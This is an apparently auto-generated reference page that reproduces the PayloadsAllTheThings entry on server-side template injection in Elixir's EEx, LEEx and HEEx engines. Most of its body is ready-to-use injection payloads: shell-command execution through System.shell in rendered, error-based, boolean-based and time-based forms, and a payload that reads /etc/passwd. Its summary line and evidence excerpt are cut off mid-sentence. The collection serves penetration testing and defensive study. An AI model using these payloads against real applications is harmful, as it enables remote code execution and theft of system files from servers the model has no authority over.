---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - Elixir

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-elixir` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Elixir.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Elixir, SSTI can occur when using templating

## Preserved Body

````markdown
> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated into templates without proper sanitization or validation.

## Templating Libraries

| Template Name | Payload Format |
|---------------|----------------|
| EEx           | `<%= %>`       |
| LEEx          | `<%= %>`       |
| HEEx          | `<%= %>`       |

## Universal Payloads

Generic code injection payloads work for many Elixir-based template engines, such as EEx, LEEx and HEEx.

By default, only EEx can render templates from string, but it is possible to use LEEx and HEEx as replacement engines for EEx.

To use these payloads, wrap them in the appropriate tag.

```erlang
elem(System.shell("id"), 0) # Rendered RCE
[1, 2][elem(System.shell("id"), 0)] # Error-Based RCE
1/((elem(System.shell("id"), 1) == 0)&&1||0) # Boolean-Based RCE
elem(System.shell("id && sleep 5"), 0) # Time-Based RCE
```

## EEx

[Official website](https://hexdocs.pm/eex/1.19.5/EEx.html)
> EEx stands for Embedded Elixir.

### EEx - Basic injections

```erlang
<%= 7 * 7 %>
```

### EEx - Retrieve /etc/passwd

```erlang
<%= File.read!("/etc/passwd") %>
```

### EEx - Remote Command execution

```erlang
<%= elem(System.shell("id"), 0) %> # Rendered RCE
<%= [1, 2][elem(System.shell("id"), 0)] %> # Error-Based RCE
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %> # Boolean-Based RCE
<%= elem(System.shell("id && sleep 5"), 0) %> # Time-Based RCE
```

## References

- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
````

## Source Verification

[source record](../../sources/payloadsallthethings/server-side-template-injection-elixir.md)

## Evidence Excerpt

```text
_body: "# Server Side Template Injection - Elixir\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises\
\ when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands.\
\ In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated\
\ into templates without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
- [Universal Payloads](#universal-payloads)\n- [EEx](#eex)\n    - [EEx - Basic injections](#eex---basic-injections)\n  \
\  - [EEx - Retrieve /etc/passwd](#eex---retrieve-etcpasswd)\n    - [EEx - Remote Command execution](#eex---remote-command-execution)\n\
- [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n|---------------|----------------|\n\
| EEx           | `<%= %>`       |\n| LEEx          | `<%= %>`       |\n| HEEx          | `<%= %>`       |\n\n## Universal\
```
